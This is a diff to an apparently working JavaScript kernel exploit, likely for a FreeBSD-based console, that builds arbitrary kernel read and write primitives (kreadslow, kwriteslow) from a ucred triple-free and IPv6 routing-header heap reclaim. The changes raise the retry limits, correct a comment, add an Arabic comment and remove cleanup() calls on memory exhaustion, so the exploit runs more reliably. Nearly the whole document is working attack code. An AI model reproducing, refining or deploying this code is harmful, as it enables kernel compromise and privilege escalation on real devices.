@@ -1222,7 +1222,7 @@ function trigger_ucred_triplefree() {
       read(new BigInt(iov_sock_0), tmp, 1);
       count++;
     }
-    if (count === 1000) {
+    if (count === 10000) {
       log('[TRIPLE] Dropped out from reclaim loop');
       close(new BigInt(uaf_socket));
       continue;
@@ -1361,7 +1361,7 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
   write32(uio.add(0x20), UIO_SYSSPACE); // uio_segflg
 
   log('[UIO] writing uio_rw');
-  write32(uio.add(0x24), read ? UIO_READ : UIO_WRITE); // uio_segflg
+  write32(uio.add(0x24), read ? UIO_READ : UIO_WRITE); // uio_rw
 
   log('[UIO] writing uio_td');
   write64(uio.add(0x28), uio_td); // uio_td
@@ -1378,48 +1378,55 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 function kreadslow(addr, size) {
   debug('[KR] Enter kreadslow addr=' + hex(addr) + ' size=' + size);
 
-  // Memory check before start
+  // بدل ما نهد الدنيا، نرجّع Error بس
   if (debugging.info.memory.available === 0) {
-    log('[KR] kreadslow - Memory exhausted before start');
-    cleanup();
+    log('[KR] kreadslow - Memory exhausted before start (SKIP ONLY, no cleanup)');
     return BigInt_Error;
   }
+
   debug('[KR] Preparing leak buffers...');
   var leak_buffers = new Array(UIO_THREAD_NUM);
   for (var i = 0; i < UIO_THREAD_NUM; i++) {
     leak_buffers[i] = malloc(size);
   }
+
   write32(sockopt_val_buf, size);
   setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
   write(new BigInt(uio_sock_1), tmp, size);
   write64(uioIovRead.add(0x08), size);
+
   free_rthdr(ipv6_socks[triplets[1]]);
   var uio_leak_add = leak_rthdr.add(0x08);
+
   debug('[KR] Starting UIO reclaim loop (stage 1)...');
   var count = 0;
   var zeroMemoryCount = 0;
+
   while (count < 10000) {
     if (count % 500 === 0) {
       log('[KR] Stage1 progress count=' + count);
       watchdog_tick('kreadslow_stage1');
     }
+
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 5) {
-        log('[KR] netctrl failed (memory exhausted in stage1)');
-        cleanup();
+        log('[KR] netctrl: memory exhausted in stage1 (kreadslow) → returning error');
         return BigInt_Error;
       }
     } else {
       zeroMemoryCount = 0;
     }
+
     count++;
     trigger_uio_writev();
     sched_yield();
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
+
     if (read32(uio_leak_add) === UIO_IOV_NUM) {
       break;
     }
+
     read(new BigInt(uio_sock_0), tmp, size);
     for (var _i1 = 0; _i1 < UIO_THREAD_NUM; _i1++) {
       read(new BigInt(uio_sock_0), leak_buffers[_i1], size);
@@ -1427,50 +1434,63 @@ function kreadslow(addr, size) {
     wait_uio_writev();
     write(new BigInt(uio_sock_1), tmp, size);
   }
+
   if (count === 10000) {
     debug('[KR] Failed UIO reclaim after 10000 iterations');
     return BigInt_Error;
   }
+
   debug('[KR] UIO reclaim succeeded after ' + count + ' iterations');
   var uio_iov = read64(leak_rthdr);
   debug('[KR] uio_iov=' + hex(uio_iov));
+
   build_uio(uio_buf, uio_iov, 0, true, addr, size);
+
   debug('[KR] Freeing triplets[2]=' + triplets[2]);
   free_rthdr(ipv6_socks[triplets[2]]);
+
   var iov_leak_add = leak_rthdr.add(0x20);
   debug('[KR] Starting IOV reclaim loop (stage 2)...');
+
   var zeroMemoryCount2 = 0;
   var count2 = 0;
+
   while (true) {
     count2++;
     if (count2 % 500 === 0) {
       log('[KR] Stage2 spinning, count=' + count2);
       watchdog_tick('kreadslow_stage2');
     }
+
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount2++;
       if (zeroMemoryCount2 >= 5) {
-        log('[KR] netctrl failed (memory exhausted in stage2)');
-        cleanup();
+        log('[KR] netctrl: memory exhausted in stage2 (kreadslow) → returning error');
         return BigInt_Error;
       }
     } else {
       zeroMemoryCount2 = 0;
     }
+
     trigger_iov_recvmsg();
     sched_yield();
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
+
     if (read32(iov_leak_add) === UIO_SYSSPACE) {
       break;
     }
+
     write(new BigInt(iov_sock_1), tmp, 1);
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
   }
+
   debug('[KR] Reading leak buffers...');
   read(new BigInt(uio_sock_0), tmp, size);
+
   var leak_buffer = new BigInt(0);
   var tag_val = new BigInt(0x41414141, 0x41414141);
+
   for (var _i10 = 0; _i10 < UIO_THREAD_NUM; _i10++) {
     read(new BigInt(uio_sock_0), leak_buffers[_i10], size);
     var val = read64(leak_buffers[_i10]);
@@ -1480,27 +1500,33 @@ function kreadslow(addr, size) {
       leak_buffer = leak_buffers[_i10].add(0);
     }
   }
+
   wait_uio_writev();
   write(new BigInt(iov_sock_1), tmp, 1);
+
   if (leak_buffer.eq(new BigInt(0))) {
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
     return BigInt_Error;
   }
+
   debug('[KR] Finding triplets[2]...');
   for (var _retry = 0; _retry < 3; _retry++) {
     triplets[2] = find_triplet(triplets[0], triplets[1]);
     if (triplets[2] !== -1) break;
     sched_yield();
   }
+
   debug('[KR] triplets[2]=' + triplets[2]);
   if (triplets[2] === -1) {
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
     return BigInt_Error;
   }
+
   wait_iov_recvmsg();
   read(new BigInt(iov_sock_0), tmp, 1);
+
   debug('[KR] Done, returning leak_buffer=' + hex(leak_buffer));
   return leak_buffer;
 }
@@ -1530,7 +1556,6 @@ function kwriteslow(addr, buffer, size) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 5) {
         log('[KW] kwriteslow: memory exhausted in stage1');
-        cleanup();
         return BigInt_Error;
       }
     } else {
@@ -1563,7 +1588,6 @@ function kwriteslow(addr, buffer, size) {
       zeroMemoryCount2++;
       if (zeroMemoryCount2 >= 5) {
         log('[KW] kwriteslow: memory exhausted in stage2');
-        cleanup();
         return BigInt_Error;
       }
     } else {
